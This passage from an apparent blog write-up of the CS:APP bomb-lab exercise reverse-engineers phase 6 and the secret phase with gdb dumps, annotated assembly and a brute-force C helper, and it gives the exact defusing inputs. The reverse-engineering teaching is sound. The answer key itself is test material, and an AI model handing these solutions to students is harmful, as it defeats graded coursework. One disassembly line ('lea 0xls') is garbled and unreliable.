<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/16c 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;  : 109 &#x27;m&#x27; 97 &#x27;a&#x27;  100 &#x27;d&#x27; 117 &#x27;u&#x27; 105 &#x27;i&#x27; 101 &#x27;e&#x27; 114 &#x27;r&#x27; 115 &#x27;s&#x27;</span><br><span class="line">0x4024b8 &lt;array.3449+8&gt;: 110 &#x27;n&#x27; 102 &#x27;f&#x27; 111 &#x27;o&#x27; 116 &#x27;t&#x27; 118 &#x27;v&#x27; 98 &#x27;b&#x27;  121 &#x27;y&#x27; 108 &#x27;l&#x27;</span><br></pre></td></tr></table></figure>

<p>发现<code>flyers</code>中的每个字符都可以找到。根据偏移确定输入的每个字符的ASCII码最低一个字节依次为<code>0x9, 0xF, 0xE, 0x5, 0x6, 0x7</code>, 答案不唯一。对照ASCII码表 <a href="http://ascii.911cha.com/%EF%BC%8C">http://ascii.911cha.com/，</a> 我们找到一组解：<code>IONUVW</code></p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
<th>图形</th>
</tr>
</thead>
<tbody><tr>
<td>0100 1001</td>
<td>73</td>
<td>49</td>
<td>I</td>
</tr>
<tr>
<td>0100 1111</td>
<td>79</td>
<td>4F</td>
<td>O</td>
</tr>
<tr>
<td>0100 1110</td>
<td>78</td>
<td>4E</td>
<td>N</td>
</tr>
<tr>
<td>0101 0101</td>
<td>85</td>
<td>55</td>
<td>U</td>
</tr>
<tr>
<td>0101 0110</td>
<td>86</td>
<td>56</td>
<td>V</td>
</tr>
<tr>
<td>0101 0111</td>
<td>87</td>
<td>57</td>
<td>W</td>
</tr>
</tbody></table>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p><code>phase_6</code>的代码如下，非常的长</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:   41 56                   push   %r14</span><br><span class="line">  4010f6:   41 55                   push   %r13</span><br><span class="line">  4010f8:   41 54                   push   %r12</span><br><span class="line">  4010fa:   55                      push   %rbp</span><br><span class="line">  4010fb:   53                      push   %rbx</span><br><span class="line">  4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">  401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line">  401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt; #读6个数，保存到$rsp</span><br><span class="line"># 步骤1：判断输入的每个数是否不超过6，且任意两个数都不相等</span><br><span class="line">  40110b:   49 89 e6                mov    %rsp,%r14</span><br><span class="line">  40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d			# %r12d = 0</span><br><span class="line">  401114:   4c 89 ed                mov    %r13,%rbp			# 初始$rbp, %r13都指向第一个数</span><br><span class="line">  401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">  40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line">  40111e:   83 f8 05                cmp    $0x5,%eax			# 每个数必须小于等于6，否则爆炸</span><br><span class="line">  401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401128:   41 83 c4 01             add    $0x1,%r12d			# %12d循环计数，每次加1</span><br><span class="line">  40112c:   41 83 fc 06             cmp    $0x6,%r12d			# 第一重循环，终止条件是%r12d等于6</span><br><span class="line">  401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:   44 89 e3                mov    %r12d,%ebx			# %ebx &lt;- %r12d</span><br><span class="line">  401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line">  401138:   8b 04 84                mov    (%rsp,%rax,4),%eax	# 将输入的下一个整数保存到%eax</span><br><span class="line">  40113b:   39 45 00                cmp    %eax,0x0(%rbp)		# 第二重循环，当前整数不能和它后面的任意一个数重复，否则爆炸； 两重循环用于确保输入的6个数没有重复数字，否则引爆炸弹</span><br><span class="line">  40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line">  401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line">  40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line">  401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line"># 步骤2：对于每个输入的整数，做这样的转换：用7减去这个整数的值替换原来的数</span><br><span class="line">  401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line">  40115b:   b9 07 00 00 00          mov    $0x7,%ecx 			# %ecx初值为7</span><br><span class="line">  401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line">  401162:   2b 10                   sub    (%rax),%edx 			# %edx = 7 - (%rax), %rax指向当前整数</span><br><span class="line">  401164:   89 10                   mov    %edx,(%rax) 			# (%rax) = %edx</span><br><span class="line">  401166:   48 83 c0 04             add    $0x4,%rax   			# 循环每执行一次, %rax指向下一个整数</span><br><span class="line">  40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">  40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line"># 步骤3：0x6032d0处表示一个包含6个节点的链表， 对于经过步骤2之后转换的每个整数i, 取链表第i个节点的value，依次保存在(%rsp + 32)处</span><br><span class="line">  40116f:   be 00 00 00 00          mov    $0x0,%esi   # esi设为0</span><br><span class="line">  401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:   48 8b 52 08             mov    0x8(%rdx),%rdx		# 访问链表</span><br><span class="line">  40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line">  40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line">  40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:   ba d0 32 60 00          mov    $0x6032d0,%edx 		# 0x6032d0处为链表，包含6个节点</span><br><span class="line">  401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2) #每次取链表中第%ecx个节点的值，保存到$rsp + 0x20 + 2 * $rsi处， %ecx表示每个</span><br><span class="line">  40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line">  401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line">  401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx	# ecx初始值为%rsp, 指向第一个数</span><br><span class="line">  40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line">  40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx		# 0x6032d0处为链表，包含6个节点</span><br><span class="line">  4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx 		# 保存6个节点的值</span><br><span class="line">  4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line">  4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line">  4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line">  4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line">  4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">  4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line">  4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"># 4.判断（%rsp + 32）处的6个整数是否为降序排列，如不满足条件引爆炸弹</span><br><span class="line">  4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line">  4011d9:   00</span><br><span class="line">  4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line">  4011df:   48 8b 43 08             mov    0x8(%rbx),%rax		#将链表下一个节点地址给rax</span><br><span class="line">  4011e3:   8b 00                   mov    (%rax),%eax			#eax为链表下一个节点的值</span><br><span class="line">  4011e5:   39 03                   cmp    %eax,(%rbx)			# 比较前后两个节点的值</span><br><span class="line">  4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;#前一个数要大于后一个，否则炸弹爆炸。即必须为降序排列</span><br><span class="line">  4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line">  4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line">  4011fb:   5b                      pop    %rbx</span><br><span class="line">  4011fc:   5d                      pop    %rbp</span><br><span class="line">  4011fd:   41 5c                   pop    %r12</span><br><span class="line">  4011ff:   41 5d                   pop    %r13</span><br><span class="line">  401201:   41 5e                   pop    %r14</span><br><span class="line">  401203:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>40111b ~ 40111e</code>： 将每个输入的整数和6比较，如存在某个数大于6，引爆炸弹。</p>
<p><code>40110b ~ 401153</code>： 双重循环，用于判断输入的6个数字中是否存在两个数相同。如果存在，引爆炸弹。</p>
<p>举例：用户可以输入<code>1,2,3,4,5,6</code>，记为<strong>序列0</strong>，满足以上两个条件。</p>
<p><code>401160 ~ 40116d</code>： 一重循环，对于<strong>序列0</strong>中的每个整数，做这样的转换：用<code>7</code>减去这个整数的结果替换原来的数，即得到<strong>序列1</strong>： <code>6,5,4,3,2,1</code>。</p>
<p>注意到<code>%edx</code>初值为<code>0x6032d0</code>， 打印这块内存，发现这是一条链表, 包含6个节点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/24x 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       0x0000014c      0x00000001      0x006032e0      0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:       0x000000a8      0x00000002      0x006032f0      0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x0000039c      0x00000003      0x00603300      0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:       0x000002b3      0x00000004      0x00603310      0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:       0x000001dd      0x00000005      0x00603320      0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:       0x000001bb      0x00000006      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>

<p><code>40116f ~ 4011d0</code>：遍历转换后的<strong>序列1</strong>，对于每个整数<code>i</code>, 取第<code>i</code>个<code>node</code>节点的值，依次存储到<code>%rsp + 32</code>处，本例中存储到<code>%rsp + 32</code>的6个数为<code>0x1bb</code>,<code>0x1dd</code>,<code>0x2b3</code>, <code>0x39c</code>, <code>0xa8</code>, <code>0x14c</code>,  记为<strong>序列2</strong>。</p>
<p><code>4011d2 ~ 4011f5</code>：判断<strong>序列2</strong>是否为降序排列，本例中的<strong>序列2</strong>不满足条件。因此我们需要回过头，调整输入的6个整数的顺序，使得序列2为降序排列，过程如下：</p>
<ul>
<li><p>链表中6个节点降序排列应为： <code>0x39c</code>,<code>0x2b3</code>,<code>0x1dd</code>,<code>0x1bb</code>,<code>0x14c</code>, <code>0xa8</code></p>
</li>
<li><p>对应的6个节点序列为：<code>node3</code>,<code>node4</code>,<code>node5</code>,<code>node6</code>,<code>node1</code>,<code>node2</code></p>
</li>
<li><p>推导出序列1: <code>3,4,5,6,1,2</code></p>
</li>
<li><p>根据序列1逆推出输入：<code>7-3, 7-4, 7-5, 7-6, 7-1, 7-2</code> -&gt; <code>4, 3, 5, 6, 1, 2</code></p>
</li>
</ul>
<p>最终得到这一关的答案为<code>4,3,5,6,1,2</code>， 唯一解。</p>
<h3 id="隐藏关"><a href="#隐藏关" class="headerlink" title="隐藏关"></a>隐藏关</h3><p>在汇编文件中搜<code>secret_phase</code>，发现<code>phase_defused</code>调用了它。先看看如何触发隐藏关，<code>phase_defused</code>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:   48 83 ec 78             sub    $0x78,%rsp</span><br><span class="line">  4015c8:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:   00 00</span><br><span class="line">  4015d1:   48 89 44 24 68          mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;	仅当第6关通过后，不进行跳转，进入隐藏关</span><br><span class="line">  4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:   be 19 26 40 00          mov    $0x402619,%esi	# 格式为&quot;%d %d %s&quot;</span><br><span class="line">  4015f5:   bf 70 38 60 00          mov    $0x603870,%edi	# 0x603870处保存第四关输入的答案， 可通过对phase_defused打断点，或者对0x603870打数据断点确认</span><br><span class="line">  4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:   83 f8 03                cmp    $0x3,%eax					# 需要输入3个参数，才能触发隐藏关，否则跳转0x401635</span><br><span class="line">  401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:   be 22 26 40 00          mov    $0x402622,%esi	# %esi处字符串&quot;DrEvil&quot;</span><br><span class="line">  401609:   48 8d 7c 24 10          lea    0xls</span><br><span class="line">  40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:   85 c0                   test   %eax,%eax</span><br><span class="line">  401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">  401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  40164b:   00 00</span><br><span class="line">  40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">  401658:   c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先查看<code>4015ff: cmp $0x3,%eax</code>， 说明<code>sscanf</code>需接受3个变参才能触发隐藏关。参数格式依次为<code>%d, %d, %s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402619</span><br><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>

<p>接下来确定<code>0x603870</code>处字符串怎么来的。在<code>0x603870</code>处设置gdb数据断点, 发现<code>0x603870</code>处内容依次变为<code>7</code>, <code>7 0</code>，然后程序退出。而<code>7 0</code>恰好是我们第四关输入的答案。 说明我们只需在第四关后添加一个合适的字符串，作为第3个参数，即可触发隐藏关。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) watch *0x603870							# 设置内存断点</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">(gdb) r</span><br><span class="line">...</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">Old value = 0</span><br><span class="line">New value = 55</span><br><span class="line">0x00007ffff7aa1b53 in __memcpy_sse2 () from /lib64/libc.so.6</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">Old value = 55</span><br><span class="line">New value = 3153975</span><br><span class="line">0x00007ffff7aa1b64 in __memcpy_sse2 () from /lib64/libc.so.6</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7 0&quot;</span><br></pre></td></tr></table></figure>

<p>根据<code>401604: mov $0x402622,%esi</code>， 确认输入的字符串为<code>&quot;DrEvil&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402622</span><br><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>

<p>因此，只需要将第四关答案改为<code>7 0 DrEvil</code>， 即可触发隐藏关。</p>
<h4 id="查看隐藏关代码"><a href="#查看隐藏关代码" class="headerlink" title="查看隐藏关代码"></a>查看隐藏关代码</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:   53                      push   %rbx</span><br><span class="line">  401243:   e8 56 02 00 00          callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:   ba 0a 00 00 00          mov    $0xa,%edx		# strtol的第三个参数，base等于10</span><br><span class="line">  40124d:   be 00 00 00 00          mov    $0x0,%esi		# strtol的第二个参数, endptr=&#x27;\0&#x27;</span><br><span class="line">  401252:   48 89 c7                mov    %rax,%rdi		# strtol的第一个参数，str=用户输入字符串</span><br><span class="line">  401255:   e8 76 f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:   48 89 c3                mov    %rax,%rbx		# 将用户输入的整数保存到%rbx</span><br><span class="line">  40125d:   8d 40 ff                lea    -0x1(%rax),%eax 	# %eax = %rax - 1</span><br><span class="line">  401260:   3d e8 03 00 00          cmp    $0x3e8,%eax		# 0x3e8 = 1000</span><br><span class="line">  401265:   76 05                   jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:   e8 ce 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:   89 de                   mov    %ebx,%esi	 	# fun7的第二个参数, %rbx</span><br><span class="line">  40126e:   bf f0 30 60 00          mov    $0x6030f0,%edi	# fun7</span><br><span class="line">  401273:   e8 8c ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:   83 f8 02                cmp    $0x2,%eax		# fun7的返回值必须为2，否则引爆</span><br><span class="line">  40127b:   74 05                   je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:   e8 b8 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:   bf 38 24 40 00          mov    $0x402438,%edi</span><br><span class="line">  401287:   e8 84 f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:   e8 33 03 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:   5b                      pop    %rbx</span><br></pre></td></tr></table></figure>

<p><code>0x401255</code>处调用了strtol函数，函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span>;</span><br></pre></td></tr></table></figure>

<p>查看<code>0x401248 ~ 0x401267</code>，发现最后一关需要输入一个整数，并且该整数不能超过1001。</p>
<p>查看<code>0x40126c ~ 0x40127b</code>， 发现调用了<code>fun7</code>函数，且该函数返回值必须为2。<code>fun7</code>接受两个入参。</p>
<p>打印<code>fun7</code>的第一个参数, 发现这是一棵二叉树。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/120x 0x6030f0</span><br><span class="line">0x6030f0 &lt;n1&gt;:  0x00000024      0x00000000      0x00603110      0x00000000</span><br><span class="line">0x603100 &lt;n1+16&gt;:       0x00603130      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603110 &lt;n21&gt;: 0x00000008      0x00000000      0x00603190      0x00000000</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x00603150      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603130 &lt;n22&gt;: 0x00000032      0x00000000      0x00603170      0x00000000</span><br><span class="line">0x603140 &lt;n22+16&gt;:      0x006031b0      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603150 &lt;n32&gt;: 0x00000016      0x00000000      0x00603270      0x00000000</span><br><span class="line">0x603160 &lt;n32+16&gt;:      0x00603230      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603170 &lt;n33&gt;: 0x0000002d      0x00000000      0x006031d0      0x00000000</span><br><span class="line">0x603180 &lt;n33+16&gt;:      0x00603290      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603190 &lt;n31&gt;: 0x00000006      0x00000000      0x006031f0      0x00000000</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:      0x00603250      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031b0 &lt;n34&gt;: 0x0000006b      0x00000000      0x00603210      0x00000000</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:      0x006032b0      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031d0 &lt;n45&gt;: 0x00000028      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031f0 &lt;n41&gt;: 0x00000001      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603210 &lt;n47&gt;: 0x00000063      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603230 &lt;n44&gt;: 0x00000023      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603250 &lt;n42&gt;: 0x00000007      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603270 &lt;n43&gt;: 0x00000014      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603290 &lt;n46&gt;: 0x0000002f      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032b0 &lt;n48&gt;: 0x000003e9      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>

<p>把这棵二叉树画出来, 发现有4层，共15个节点：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">                                        0x24</span><br><span class="line">                              /                       \</span><br><span class="line">                 0x8                                            0x32</span><br><span class="line">            /           \                                   /           \</span><br><span class="line">      0x6                   0x16                    0x2d                    0x6b</span><br><span class="line">    /    \                 /     \                 /     \                 /     \</span><br><span class="line">0x1        0x7        0x14        0x23        0x28        0x2f        0x63        0x3e9</span><br></pre></td></tr></table></figure>

<p><code>fun7</code>代码如下，可以看出这是个递归函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401208:   48 85 ff                test   %rdi,%rdi</span><br><span class="line">  40120b:   74 2b                   je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:   8b 17                   mov    (%rdi),%edx		# 首次调用fun7时， rdi指向二叉树的根节点</span><br><span class="line">  40120f:   39 f2                   cmp    %esi,%edx		# 如当前节点值小于等于用户输入的数，跳转到0x401220</span><br><span class="line">  401211:   7e 0d                   jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:   48 8b 7f 08             mov    0x8(%rdi),%rdi	# 取当前节点的左子女</span><br><span class="line">  401217:   e8 e8 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:   01 c0                   add    %eax,%eax</span><br><span class="line">  40121e:   eb 1d                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401225:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401227:   74 14                   je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:   48 8b 7f 10             mov    0x10(%rdi),%rdi	# 取当前节点的右子女</span><br><span class="line">  40122d:   e8 d2 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax # %eax = 2 * $rax + 1</span><br><span class="line">  401236:   eb 05                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:   b8 ff ff ff ff          mov    $0xffffffff,%eax	# 当前节点为NULL，返回-1</span><br><span class="line">  40123d:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401241:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>将递归逻辑转换为C语言， 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二叉树的数组表示，树高4层, 共15个节点</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> arrTree[] = &#123; <span class="number">0x24</span>,</span><br><span class="line">                        <span class="number">0x8</span>, <span class="number">0x32</span>,</span><br><span class="line">                        <span class="number">0x6</span>, <span class="number">0x16</span>, <span class="number">0x2d</span>, <span class="number">0x6b</span>,</span><br><span class="line">                        <span class="number">0x1</span>, <span class="number">0x7</span> , <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x28</span>, <span class="number">0x2f</span>, <span class="number">0x63</span>, <span class="number">0x3e9</span> &#125;;</span><br><span class="line"><span class="comment">// idx表示数组arrTree索引，userInput即用户输入的答案</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun7</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> userInput)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt; <span class="number">14</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如当前节点为NULL, 返回-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(arrTree[idx] &lt; userInput) &#123;</span><br><span class="line">        ret = <span class="number">2</span> * fun7(<span class="number">2</span> * idx + <span class="number">2</span>, userInput) + <span class="number">1</span>; <span class="comment">// 取当前节点的右子女</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(arrTree[idx] &gt; userInput) &#123;</span><br><span class="line">        ret = <span class="number">2</span> * fun7(<span class="number">2</span> * idx + <span class="number">1</span>, userInput); 	<span class="comment">// 取当前节点的左子女</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1002</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span>(fun7(<span class="number">0</span>, i) == <span class="number">2</span>) <span class="comment">// idx初值为0, 表示从二叉树的根开始递归</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;answer: %d\n&quot;</span>, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行C程序，打印如下，说明答案有两组, 输入<code>20</code>或<code>22</code>都可以。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">answer: 20</span><br><span class="line">answer: 22</span><br></pre></td></tr></table></figure>

